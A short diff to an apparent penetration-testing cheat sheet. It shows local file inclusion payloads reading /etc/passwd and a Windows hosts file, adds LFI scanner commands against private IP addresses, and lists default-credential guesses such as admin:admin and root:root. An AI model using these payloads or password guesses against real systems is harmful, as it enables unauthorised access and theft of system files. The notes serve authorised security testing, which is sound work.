@@ -95,11 +95,15 @@ http://web/dept/?lang=/etc/passwd
 http://web/dept/?lang=/windows/system32/drivers/etc/hosts 
 http://web/dept/?lang=\\192.168.162.46\hello.txt   
 
+LFI Scan: 
+python fi-cyberscan.py -t http://192.168.200.5/cyber.php?page= -m1 
+fimap -u 192.168.200.5 
+
  
 =================================== 
 Admin/Logins
 
-Guess: admin:admin 
+Guess: admin:admin, root:root, administrator:password
 Google Default Password
 Reuse (if you've found user/pass) 
 MyApp Authentication Bypass (google) 
